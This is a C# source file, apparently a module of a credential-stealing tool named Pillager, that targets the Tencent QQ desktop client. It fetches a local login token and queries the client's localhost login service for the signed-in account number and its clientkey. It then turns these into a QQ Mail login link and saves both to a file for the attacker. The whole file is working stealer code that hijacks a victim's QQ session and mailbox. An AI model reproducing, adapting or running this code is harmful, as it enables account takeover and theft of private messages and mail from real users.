using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;

namespace Pillager.IM
{
    internal class QQ
    {
        public static string IMName = "QQ";

        public static string get_pt_local_token()
        {
            try
            {
                Uri uri = new Uri(@"https://xui.ptlogin2.qq.com/cgi-bin/xlogin?proxy_url=https%3A//qzs.qq.com/qzone/v6/portal/proxy.html&daid=5&&hide_title_bar=1&low_login=0&qlogin_auto_login=1&no_verifyimg=1&link_target=blank&style=22&target=self&s_url=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone");

                HttpWebRequest myRequest = (HttpWebRequest)WebRequest.Create(uri);
                myRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0";
                myRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
                myRequest.Referer = "https://i.qq.com/";
                HttpWebResponse response = (HttpWebResponse)myRequest.GetResponse();
                string temp = response.Headers.Get("Set-Cookie");
                string[] cookstr = temp.Replace(" ", "").Split(new char[] { ',', ';' });
                string pt_local_token = "";
                foreach (string str in cookstr)
                {
                    string[] cookieNameValue = str.Split('=');
                    if (cookieNameValue[0] == "pt_local_token")
                        pt_local_token = cookieNameValue[1];
                }
                return pt_local_token;
            }
            catch
            {
                return "";
            }

        }

        public static string get_unis(string pt_local_token)
        {
            try
            {
                Uri uri = new Uri(@"https://localhost.ptlogin2.qq.com:4301/pt_get_uins?callback=ptui_getuins_CB&pt_local_tk=" + pt_local_token);
                HttpWebRequest myRequest = (HttpWebRequest)WebRequest.Create(uri);
                myRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0";
                myRequest.Accept = "*/*";
                myRequest.Referer = "https://xui.ptlogin2.qq.com/";
                myRequest.CookieContainer = new CookieContainer();
                myRequest.CookieContainer.Add(new Cookie("pt_local_token", pt_local_token, "/", ".qq.com"));
                myRequest.CookieContainer.Add(new Cookie("_qz_referrer", "i.qq.com", "/", ".qq.com"));
                HttpWebResponse response = (HttpWebResponse)myRequest.GetResponse();
                Stream temp = response.GetResponseStream();
                using (StreamReader sr = new StreamReader(temp))
                {
                    string content = sr.ReadToEnd();
                    string[] cookstr = content.Replace(" ", "").Split(new char[] { ',', ':' });
                    if (cookstr.Length > 0)
                        return cookstr[1];
                }
                return "";
            }
            catch
            {
                return "";
            }

        }

        public static string get_qkey(string pt_local_token, string uin)
        {
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(new Uri(@"https://localhost.ptlogin2.qq.com:4301/pt_get_st?clientuin=" + uin + "&r=0.1111111111111111&pt_local_tk=" + pt_local_token + "&callback=__jp0"));
                request.CookieContainer = new CookieContainer();
                request.CookieContainer.Add(new Cookie("pt_local_token", pt_local_token, "/", ".qq.com"));
                request.CookieContainer.Add(new Cookie("clientuin", "uin", "/", ".qq.com"));
                request.CookieContainer.Add(new Cookie("pt2gguin", "o" + uin + "_qz_referrer=i.qq.com", "/", ".qq.com"));
                request.Referer = "https://xui.ptlogin2.qq.com/";
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0";
                request.Accept = "*/*";
                HttpWebResponse response2 = (HttpWebResponse)request.GetResponse();
                string temp = response2.Headers.Get("Set-Cookie");
                string[] cookstr = temp.Replace(" ", "").Split(new char[] { ',', ';' });
                foreach (string str in cookstr)
                {
                    string[] cookieNameValue = str.Split('=');
                    if (cookieNameValue[0] == "clientkey")
                        return cookieNameValue[1];
                }
                return "";
            }
            catch
            {
                return "";
            }
        }

        public static string get_link(string clientkey, string uin)
        {
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(new Uri("https://ptlogin2.qq.com/jump?clientuin=" + uin + "&clientkey=" + clientkey + "&keyindex=9&u1=https%3A%2F%2Fmail.qq.com%2Fcgi-bin%2Flogin%3Fvt%3Dpassport%26vm%3Dwpt%26ft%3Dloginpage%26target%3D&pt_local_tk=&pt_3rd_aid=0&ptopt=1&style=25"));
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0";
                request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                Stream temp = response.GetResponseStream();
                using (StreamReader sr = new StreamReader(temp))
                {
                    string content = sr.ReadToEnd();
                    string[] cookstr = content.Replace(" ", "").Split(new char[] { '\'' });
                    if (cookstr.Length > 0)
                        return cookstr[3];
                }
                return "";
            }
            catch
            {
                return "";
            }

        }

        public static void Save(string path)
        {
            try
            {
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)(768 | 3072);
                string pt_local_token = get_pt_local_token();
                if (pt_local_token == "") return;
                string uin = get_unis(pt_local_token);
                if (uin == "") return;
                string clientkey = get_qkey(pt_local_token, uin);
                if (clientkey == "") return;
                string link = get_link(clientkey, uin);
                if (link == "") return;

                string savepath = Path.Combine(path, IMName);
                Directory.CreateDirectory(savepath);
                StringBuilder sb = new StringBuilder();
                sb.AppendLine("QQ:" + uin);
                sb.AppendLine("Mail:" + link);
                File.WriteAllText(Path.Combine(savepath, IMName + "_ClientKey.txt"), sb.ToString());
            }
            catch { }
        }
    }
}
